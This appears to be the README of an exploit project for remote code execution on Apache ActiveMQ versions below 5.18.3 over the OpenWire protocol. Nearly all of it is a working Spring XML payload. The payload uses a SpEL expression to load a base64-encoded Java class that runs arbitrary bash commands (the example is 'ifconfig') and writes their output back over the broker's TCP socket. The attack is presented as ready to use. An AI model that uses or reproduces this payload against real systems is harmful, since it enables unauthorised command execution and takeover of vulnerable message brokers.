# ActiveMqRCE 有回显
用java实现构造openwire协议，利用activeMQ &lt; 5.18.3 RCE



## 11.16号新增有回显的命令执行exp
```xml
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:spring="http://camel.apache.org/schema/spring"
       xmlns:context="http://www.springframework.org/schema/context"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://camel.apache.org/schema/spring http://camel.apache.org/schema/spring/camel-spring.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd">
    <context:property-placeholder ignore-resource-not-found="false" ignore-unresolvable="false"/>

    <bean  class="#{T(org.springframework.cglib.core.ReflectUtils).defineClass('CMDResponse',T(org.springframework.util.Base64Utils).decodeFromString('yv66vgAAADQAlAoAIABSBwBTBwBUCABVCABWCgACAFcKAAIAWAoAWQBaBwBbCgAJAFIKAFwAXQoACQBeCgBfAGAIAGEKAGIAYwgAOAoAYgBkCgBlAGYKAGUAZwcAaAgAaQgAPgcAagoAFwBrCABsCgADAG0KAG4AbwoACQBwCgBuAHEHAHIHAHMHAHQBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEADUxDTURSZXNwb25zZTsBAAR0ZXN0AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAOcHJvY2Vzc0J1aWxkZXIBABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEABXN0YXJ0AQATTGphdmEvbGFuZy9Qcm9jZXNzOwEAC2lucHV0U3RyZWFtAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQAVYnl0ZUFycmF5T3V0cHV0U3RyZWFtAQAfTGphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtOwEABHJlYWQBAAFJAQAGdGhyZWFkAQASTGphdmEvbGFuZy9UaHJlYWQ7AQAGYUNsYXNzAQARTGphdmEvbGFuZy9DbGFzczsBAAZ0YXJnZXQBABlMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAJdHJhbnNwb3J0AQAwTG9yZy9hcGFjaGUvYWN0aXZlbXEvdHJhbnNwb3J0L3RjcC9UY3BUcmFuc3BvcnQ7AQAHYUNsYXNzMQEAC3NvY2tldGZpZWxkAQAGc29ja2V0AQARTGphdmEvbmV0L1NvY2tldDsBAAxvdXRwdXRTdHJlYW0BABZMamF2YS9pby9PdXRwdXRTdHJlYW07AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQAWTG9jYWxWYXJpYWJsZVR5cGVUYWJsZQEAFExqYXZhL2xhbmcvQ2xhc3M8Kj47AQANU3RhY2tNYXBUYWJsZQcAcwcAVAcAUwcAdQcAdgcAWwcAcgEACkV4Y2VwdGlvbnMHAHcBAApTb3VyY2VGaWxlAQAQQ01EUmVzcG9uc2UuamF2YQwAIQAiAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyAQAQamF2YS9sYW5nL1N0cmluZwEACS9iaW4vYmFzaAEAAi1jDAAhAHgMACwAeQcAdQwAegB7AQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0HAHYMADIAfAwAfQB+BwB/DACAAIEBABBqYXZhLmxhbmcuVGhyZWFkBwCCDACDAIQMAIUAhgcAhwwAiACJDACKAIsBAC5vcmcvYXBhY2hlL2FjdGl2ZW1xL3RyYW5zcG9ydC90Y3AvVGNwVHJhbnNwb3J0AQAub3JnLmFwYWNoZS5hY3RpdmVtcS50cmFuc3BvcnQudGNwLlRjcFRyYW5zcG9ydAEAD2phdmEvbmV0L1NvY2tldAwAjACNAQABCgwAjgCPBwCQDAB9AJEMAJIAjwwAkwAiAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAC0NNRFJlc3BvbnNlAQAQamF2YS9sYW5nL09iamVjdAEAEWphdmEvbGFuZy9Qcm9jZXNzAQATamF2YS9pby9JbnB1dFN0cmVhbQEAE2phdmEvaW8vSU9FeGNlcHRpb24BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7AQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAAygpSQEABXdyaXRlAQAEKEkpVgEAEGphdmEvbGFuZy9UaHJlYWQBAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsBAA9qYXZhL2xhbmcvQ2xhc3MBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAA9nZXRPdXRwdXRTdHJlYW0BABgoKUxqYXZhL2lvL091dHB1dFN0cmVhbTsBAAhnZXRCeXRlcwEABCgpW0IBABRqYXZhL2lvL091dHB1dFN0cmVhbQEABShbQilWAQALdG9CeXRlQXJyYXkBAAVjbG9zZQAhAB8AIAAAAAAAAgABACEAIgABACMAAAAvAAEAAQAAAAUqtwABsQAAAAIAJAAAAAYAAQAAAAQAJQAAAAwAAQAAAAUAJgAnAAAAAQAoACkAAgAjAAACGwAGAA8AAAC1uwACWQa9AANZAxIEU1kEEgVTWQUrU7cABk0stgAHTi22AAg6BLsACVm3AAo6BQM2BhkEtgALWTYGAp8ADRkFFQa2AAyn/+24AA06BxIOuAAPOggZCBIQtgAROgkZCQS2ABIZCRkHtgATwAAUOgoSFbgADzoLGQsSFrYAEToMGQwEtgASGQwZCrYAE8AAFzoNGQ22ABg6DhkOEhm2ABq2ABsZDhkFtgActgAbGQ62AB2nAARNsQABAAAAsACzAB4ABAAkAAAAXgAXAAAACQAaAAoAHwALACUADAAuAA0AMQAOAD0ADwBHABIATAATAFMAFABcABUAYgAWAG4AFwB1ABgAfgAZAIQAGgCQABsAlwAcAKEAHQCrAB4AsAAiALMAIAC0ACYAJQAAAJgADwAaAJYAKgArAAIAHwCRACwALQADACUAiwAuAC8ABAAuAIIAMAAxAAUAMQB/ADIAMwAGAEwAZAA0ADUABwBTAF0ANgA3AAgAXABUADgAOQAJAG4AQgA6ADsACgB1ADsAPAA3AAsAfgAyAD0AOQAMAJAAIAA+AD8ADQCXABkAQABBAA4AAAC1ACYAJwAAAAAAtQBCAEMAAQBEAAAAFgACAFMAXQA2AEUACAB1ADsAPABFAAsARgAAAC4ABP8AMQAHBwBHBwBIBwBJBwBKBwBLBwBMAQAAFf8AawACBwBHBwBIAAEHAE0AAE4AAAAEAAEATwABAFAAAAACAFE='),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).newInstance().test('ifconfig')}">
    </bean>
</beans>
```

![img.png](img.png)